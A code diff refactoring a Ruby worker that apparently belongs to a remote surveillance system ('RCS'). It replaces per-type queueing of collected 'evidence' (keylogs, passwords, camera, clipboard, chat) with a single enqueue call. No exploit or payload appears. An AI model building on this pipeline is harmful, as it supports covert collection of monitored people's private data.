@@ -1,20 +1,13 @@
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/evidence'
+require 'rcs-common/path_utils'
 
-if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
-  require 'rcs-db-release/config'
-  require 'rcs-db-release/db_layer'
-  require 'rcs-db-release/grid'
-  require 'rcs-db-release/alert'
-  require 'rcs-db-release/connectors'
-else
-  require 'rcs-db/config'
-  require 'rcs-db/db_layer'
-  require 'rcs-db/grid'
-  require 'rcs-db/alert'
-  require 'rcs-db/connectors'
-end
+require_release 'rcs-db/config'
+require_release 'rcs-db/db_layer'
+require_release 'rcs-db/grid'
+require_release 'rcs-db/alert'
+require_release 'rcs-db/connector_manager'
 
 require_relative 'call_processor'
 require_relative 'mic_processor'
@@ -203,9 +196,6 @@ class InstanceWorker
             trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
           end
 
-          # forward raw evidence
-          #RCS::DB::Connectors.new_raw(raw_id, index, @agent, evidence_id) unless evidence_id.nil?
-
           # delete raw evidence
           RCS::DB::GridFS.delete(raw_id, "evidence")
           trace :debug, "deleted raw evidence #{raw_id}"
@@ -221,37 +211,7 @@ class InstanceWorker
   end
 
   def save_evidence(evidence)
-    # check if there are matching alerts for this evidence
-    RCS::DB::Alerting.new_evidence(evidence)
-
-    # forward the evidence to connectors (if any) return if not kept in the db
-    # since the evidence is destroyed
-    return unless RCS::DB::Connectors.new_evidence(evidence)
-
-    # add to the ocr processor queue
-    if LicenseManager.instance.check :ocr
-      if evidence.type == 'screenshot' or (evidence.type == 'file' and evidence.data[:type] == :capture)
-        OCRQueue.add(@target._id, evidence._id)
-      end
-    end
-
-    # add to the translation queue
-    if LicenseManager.instance.check :translation and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
-      TransQueue.add(@target._id, evidence._id)
-      evidence.data[:tr] = "TRANS_QUEUED"
-      evidence.save
-    end
-
-    # add to the aggregator queue
-    if LicenseManager.instance.check :correlation
-      AggregatorQueue.add(@target._id, evidence._id, evidence.type)
-    end
-
-    # Do not check the intelligence license is enabled here. Some of the intelligence
-    # features are provided WITHOUT the intelligence license.
-    if ['addressbook', 'password', 'position', 'camera'].include?(evidence.type)
-      IntelligenceQueue.add(@target._id, evidence._id, :evidence)
-    end
+    evidence.enqueue
   end
 
   def resume
